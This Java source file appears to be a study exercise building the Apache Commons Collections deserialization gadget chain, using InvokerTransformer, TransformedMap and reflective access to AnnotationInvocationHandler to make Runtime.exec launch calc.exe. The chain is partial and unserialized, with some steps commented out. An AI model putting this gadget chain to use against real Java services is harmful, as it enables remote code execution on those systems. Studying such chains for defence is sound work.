package org.ixpqxi;


import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
//        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
//        invokerTransformer.transform(runtime);

        HashMap<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        @SuppressWarnings("unchecked")
        Map<Object, Object> decorate = TransformedMap.decorate(map, null, invokerTransformer);
//        for(Map.Entry entry : decorate.entrySet()) {
//            entry.setValue(runtime);
//        }

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        constructor.newInstance(Override.class, decorate);
    }
}